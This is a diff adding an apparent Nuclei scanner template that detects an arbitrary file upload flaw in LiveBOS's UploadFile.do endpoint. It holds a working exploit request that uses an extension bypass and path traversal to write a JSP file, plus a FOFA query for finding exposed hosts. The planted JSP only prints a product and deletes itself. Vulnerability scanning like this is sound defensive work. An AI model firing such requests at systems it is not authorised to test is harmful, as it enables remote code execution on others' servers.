@@ -1,0 +1,44 @@
+id: livebos-uploadfile-fileupload
+
+info:
+  name: LiveBOS UploadFile.do Arbitrary File Upload
+  author: Co5mos
+  severity: critical
+  description: |
+    LiveBOS's `UploadFile.do` endpoint has an arbitrary file upload vulnerability that allows attackers to upload malicious files and execute arbitrary code on the server.
+  metadata:
+    fofa-query: app="LiveBOS-框架"
+  tags: livebos, file-upload, rce
+
+variables:
+  filename: "{{rand_base(6)}}.jsp"
+  num1: "{{rand_int(10000, 20000)}}"
+  num2: "{{rand_int(10000, 20000)}}"
+  result: "{{to_number(num1)*to_number(num2)}}"
+  boundary: "{{rand_base(30)}}"
+
+http:
+  - raw:
+      - |
+        POST /feed/UploadFile.do;.css.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip
+        Content-Type: multipart/form-data; boundary=---------------------------{{boundary}}
+
+        ---------------------------{{boundary}}
+        Content-Disposition: form-data; name="NewFile"; filename="/../../../{{filename}}"
+        Content-Type: text/plain
+
+        <% out.print({{num1}}*{{num2}});new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        ---------------------------{{boundary}}--
+
+      - |
+        GET /{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_2 == 200
+          - contains(body_2, '{{result}}')
+        condition: and
